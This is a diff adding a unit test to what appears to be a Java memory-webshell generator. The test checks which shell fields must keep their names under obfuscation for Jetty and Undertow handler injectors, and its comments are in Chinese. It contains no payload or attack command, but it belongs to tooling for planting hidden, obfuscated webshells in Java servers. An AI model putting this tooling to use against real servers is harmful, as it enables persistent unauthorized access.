@@ -1,5 +1,6 @@
 package com.reajason.javaweb.memshell;
 
+import com.reajason.javaweb.memshell.obfuscation.FieldContracts;
 import com.reajason.javaweb.memshell.obfuscation.MethodContracts;
 import com.reajason.javaweb.memshell.server.AbstractServer;
 import com.reajason.javaweb.memshell.server.InjectorMapping;
@@ -90,6 +91,19 @@ class ServerContractDefaultsTest {
         Undertow undertow = new Undertow();
         assertSame(MethodContracts.UNDERTOW_HANDLER_CONTRACTS, undertow.getShellMethodContracts(HANDLER));
         assertSame(MethodContracts.UNDERTOW_HANDLER_CONTRACTS, undertow.getShellMethodContracts(JAKARTA_HANDLER));
+    }
+
+    @Test
+    void shellFieldContractsAreOnlyDeclaredForReflectiveInjectorFields() {
+        // 默认没有注入器按名反射读写的 shell 字段
+        assertTrue(BARE.getShellFieldContracts(FILTER).isEmpty());
+        assertTrue(BARE.getShellFieldContracts(HANDLER).isEmpty());
+
+        // JettyHandlerInjector 注入后回填 nextHandler，字段名必须保留
+        Jetty jetty = new Jetty();
+        assertSame(FieldContracts.JETTY_HANDLER_FIELDS, jetty.getShellFieldContracts(HANDLER));
+        assertSame(FieldContracts.JETTY_HANDLER_FIELDS, jetty.getShellFieldContracts(JAKARTA_HANDLER));
+        assertTrue(jetty.getShellFieldContracts(FILTER).isEmpty());
     }
 
     @Test
